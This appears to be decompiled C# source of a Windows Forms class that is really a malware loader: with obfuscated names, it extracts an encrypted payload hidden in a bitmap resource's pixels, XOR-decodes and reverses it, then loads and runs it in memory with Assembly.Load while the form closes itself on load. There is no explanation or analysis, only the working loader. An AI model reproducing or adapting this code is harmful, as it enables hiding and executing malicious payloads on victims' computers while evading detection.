using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using WindowsFormsApplication2.Properties;

namespace WindowsFormsApplication2;

public class ComwsZUkGnwjLnErd : Form
{
	private IContainer components = null;

	private string[] YaGlZkNFUgEDNTByzcI;

	private byte[] KmseCZEBwAYCltnaVE;

	private byte[] jrbMkGwQvymlucx;

	private BitmapData nMDvqHqSCcU;

	private IntPtr CuDbRLmGlmYfX;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(489, 199));
		((Control)this).set_Name("ComwsZUkGnwjLnErd");
		((Control)this).set_Text("ComwsZUkGnwjLnErd");
		((Form)this).add_Load((EventHandler)ComwsZUkGnwjLnErd_Load);
		((Control)this).ResumeLayout(false);
		Bitmap val = (Bitmap)Resources.ResourceManager.GetObject("WkYuQVOBnuauMVeowP");
		byte[] array = new byte[((Image)val).get_Width() * ((Image)val).get_Height() * 4];
		Rectangle rectangle = new Rectangle(0, 0, ((Image)val).get_Width(), ((Image)val).get_Height());
		nMDvqHqSCcU = val.LockBits(rectangle, (ImageLockMode)3, ((Image)val).get_PixelFormat());
		Marshal.Copy(nMDvqHqSCcU.get_Scan0(), array, 0, array.Length);
		jrbMkGwQvymlucx = (byte[])Resources.ResourceManager.GetObject("yIHAWlwCktqTiYwtKyP");
		int num = 0;
		for (int i = 0; i < 4; i++)
		{
			int num2 = 1;
			for (int j = 0; j < i; j++)
			{
				num2 *= 256;
			}
			num += num2 * array[i];
		}
		KmseCZEBwAYCltnaVE = new byte[num];
		Array.Copy(array, 4, KmseCZEBwAYCltnaVE, 0, KmseCZEBwAYCltnaVE.Length);
		DvrtCOtwKmYAsEGvBJ();
		byte[] array2 = new byte[KmseCZEBwAYCltnaVE.Length];
		for (int i = 0; i < array2.Length; i++)
		{
			array2[i] = KmseCZEBwAYCltnaVE[i];
		}
		for (int i = 0; i < array2.Length; i++)
		{
			KmseCZEBwAYCltnaVE[KmseCZEBwAYCltnaVE.Length - i - 1] = array2[i];
		}
		TffTcTqHZFIYCnp();
	}

	private void DvrtCOtwKmYAsEGvBJ()
	{
		for (int i = 0; i < KmseCZEBwAYCltnaVE.Length; i++)
		{
			for (int j = 0; j < jrbMkGwQvymlucx.Length; j++)
			{
				KmseCZEBwAYCltnaVE[i] = (byte)(KmseCZEBwAYCltnaVE[i] ^ jrbMkGwQvymlucx[j]);
			}
		}
	}

	private void TffTcTqHZFIYCnp()
	{
		Assembly assembly = Assembly.Load(KmseCZEBwAYCltnaVE);
		assembly.EntryPoint!.Invoke(null, new object[1] { YaGlZkNFUgEDNTByzcI });
	}

	public ComwsZUkGnwjLnErd(string[] args)
	{
		YaGlZkNFUgEDNTByzcI = args;
		Thread.Sleep(0);
		InitializeComponent();
	}

	private void ComwsZUkGnwjLnErd_Load(object sender, EventArgs e)
	{
		((Form)this).Close();
	}
}
